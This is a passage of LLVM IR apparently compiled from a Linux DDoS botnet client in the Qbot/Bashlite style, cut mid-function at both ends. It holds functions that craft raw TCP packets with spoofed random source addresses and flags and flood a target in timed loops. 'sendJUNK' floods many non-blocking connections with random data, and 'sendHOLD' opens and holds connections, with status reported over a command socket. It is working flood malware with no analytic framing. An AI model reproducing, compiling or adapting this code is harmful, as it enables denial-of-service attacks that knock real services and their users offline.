  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.44, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @getRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %226

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  store i32 %47, i32* %17, align 4
  br label %48

; <label>:48:                                     ; preds = %223, %32
  %49 = load i32, i32* %17, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %224

; <label>:52:                                     ; preds = %48
  store i32 0, i32* %8, align 4
  br label %53

; <label>:53:                                     ; preds = %220, %52
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* %7, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %223

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %59
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %60, i32 0, i32 1
  %62 = load i8, i8* %61, align 4
  %63 = zext i8 %62 to i32
  switch i32 %63, label %219 [
    i32 0, label %64
    i32 1, label %108
    i32 2, label %193
  ]

; <label>:64:                                     ; preds = %57
  %65 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %67
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %68, i32 0, i32 0
  store i32 %65, i32* %69, align 8
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 3, i8* null)
  %81 = or i32 %80, 2048
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 4, i32 %81)
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %84
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 8
  %88 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 16)
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %95, label %91

; <label>:91:                                     ; preds = %64
  %92 = call i32* @__errno_location() #13
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 115
  br i1 %94, label %95, label %102

; <label>:95:                                     ; preds = %91, %64
  %96 = load i32, i32* %8, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %97
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 8
  %101 = call i32 @close(i32 %100)
  br label %107

; <label>:102:                                    ; preds = %91
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 1
  store i8 1, i8* %106, align 4
  br label %107

; <label>:107:                                    ; preds = %102, %95
  br label %219

; <label>:108:                                    ; preds = %57
  br label %109

; <label>:109:                                    ; preds = %108
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %111 = getelementptr inbounds [16 x i64], [16 x i64]* %110, i64 0, i64 0
  %112 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %111) #2, !srcloc !6
  %113 = extractvalue { i64, i64* } %112, 0
  %114 = extractvalue { i64, i64* } %112, 1
  %115 = trunc i64 %113 to i32
  store i32 %115, i32* %18, align 4
  %116 = ptrtoint i64* %114 to i64
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  br label %118

; <label>:118:                                    ; preds = %109
  br label %119

; <label>:119:                                    ; preds = %118
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = srem i32 %124, 64
  %126 = zext i32 %125 to i64
  %127 = shl i64 1, %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = sdiv i32 %133, 64
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 %135
  %137 = load i64, i64* %136, align 8
  %138 = or i64 %137, %127
  store i64 %138, i64* %136, align 8
  %139 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %139, align 8
  %140 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %140, align 8
  %141 = load i32, i32* %8, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %142
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = add nsw i32 %145, 1
  %147 = call i32 @select(i32 %146, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %147, i32* %15, align 4
  %148 = load i32, i32* %15, align 4
  %149 = icmp eq i32 %148, 1
  br i1 %149, label %150, label %177

; <label>:150:                                    ; preds = %119
  store i32 4, i32* %13, align 4
  %151 = load i32, i32* %8, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = bitcast i32* %14 to i8*
  %157 = call i32 @getsockopt(i32 %155, i32 1, i32 4, i8* %156, i32* %13) #2
  %158 = load i32, i32* %14, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %171

; <label>:160:                                    ; preds = %150
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* %8, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %168
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %169, i32 0, i32 1
  store i8 0, i8* %170, align 4
  br label %176

; <label>:171:                                    ; preds = %150
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 1
  store i8 2, i8* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %171, %160
  br label %192

; <label>:177:                                    ; preds = %119
  %178 = load i32, i32* %15, align 4
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %191

; <label>:180:                                    ; preds = %177
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 8
  %186 = call i32 @close(i32 %185)
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 1
  store i8 0, i8* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %180, %177
  br label %192

; <label>:192:                                    ; preds = %191, %176
  br label %219

; <label>:193:                                    ; preds = %57
  %194 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %194, i32 1024)
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = load i8*, i8** %16, align 8
  %201 = call i64 @send(i32 %199, i8* %200, i64 1024, i32 16384)
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %218

; <label>:203:                                    ; preds = %193
  %204 = call i32* @__errno_location() #13
  %205 = load i32, i32* %204, align 4
  %206 = icmp ne i32 %205, 11
  br i1 %206, label %207, label %218

; <label>:207:                                    ; preds = %203
  %208 = load i32, i32* %8, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %209
  %211 = getelementptr inbounds %struct.state_t, %struct.state_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = call i32 @close(i32 %212)
  %214 = load i32, i32* %8, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %215
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %216, i32 0, i32 1
  store i8 0, i8* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %207, %203, %193
  br label %219

; <label>:219:                                    ; preds = %218, %192, %107, %57
  br label %220

; <label>:220:                                    ; preds = %219
  %221 = load i32, i32* %8, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %8, align 4
  br label %53

; <label>:223:                                    ; preds = %53
  br label %48

; <label>:224:                                    ; preds = %48
  %225 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %225)
  br label %226

; <label>:226:                                    ; preds = %224, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %256

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %253, %34
  %51 = load i32, i32* %17, align 4
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %254

; <label>:54:                                     ; preds = %50
  store i32 0, i32* %8, align 4
  br label %55

; <label>:55:                                     ; preds = %250, %54
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %253

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %8, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %61
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %62, i32 0, i32 1
  %64 = load i8, i8* %63, align 4
  %65 = zext i8 %64 to i32
  switch i32 %65, label %249 [
    i32 0, label %66
    i32 1, label %110
    i32 2, label %195
  ]

; <label>:66:                                     ; preds = %59
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %68 = load i32, i32* %8, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %69
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %70, i32 0, i32 0
  store i32 %67, i32* %71, align 8
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 3, i8* null)
  %83 = or i32 %82, 2048
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %83)
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %86
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %91 = call i32 @connect(i32 %89, %struct.sockaddr* %90, i32 16)
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %97, label %93

; <label>:93:                                     ; preds = %66
  %94 = call i32* @__errno_location() #13
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 115
  br i1 %96, label %97, label %104

; <label>:97:                                     ; preds = %93, %66
  %98 = load i32, i32* %8, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 8
  %103 = call i32 @close(i32 %102)
  br label %109

; <label>:104:                                    ; preds = %93
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 1
  store i8 1, i8* %108, align 4
  br label %109

; <label>:109:                                    ; preds = %104, %97
  br label %249

; <label>:110:                                    ; preds = %59
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %113 = getelementptr inbounds [16 x i64], [16 x i64]* %112, i64 0, i64 0
